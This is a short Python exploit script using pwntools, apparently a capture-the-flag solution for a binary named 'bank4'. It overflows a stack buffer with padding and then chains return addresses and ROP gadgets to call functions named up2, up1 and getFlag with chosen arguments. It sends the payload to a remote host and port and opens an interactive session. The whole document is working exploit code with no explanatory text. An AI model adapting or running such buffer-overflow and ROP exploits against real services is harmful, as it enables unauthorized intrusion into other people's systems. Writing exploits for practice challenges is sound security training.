from pwn import *

binary = context.binary = ELF('./bank4')
rop = ROP(binary)

pop_ebp_ret = rop.find_gadget(['pop ebp', 'ret'])[0]

#p = process('./bank4')
p = remote('61.28.237.24', '30205')

payload = b'A' * (0x4c + 4)
payload += p32(binary.sym.up2)
payload += p32(pop_ebp_ret)
payload += p32(pop_ebp_ret)
payload += p32(pop_ebp_ret)
payload += p32(0x12345678)
payload += p32(binary.sym.up1)
payload += p32(binary.sym.getFlag)
payload += p32(0x1337)
payload += p32(0xDEAD)



f = open('solve.txt', 'wb')

f.write(payload)

p.sendline(payload)

p.interactive()
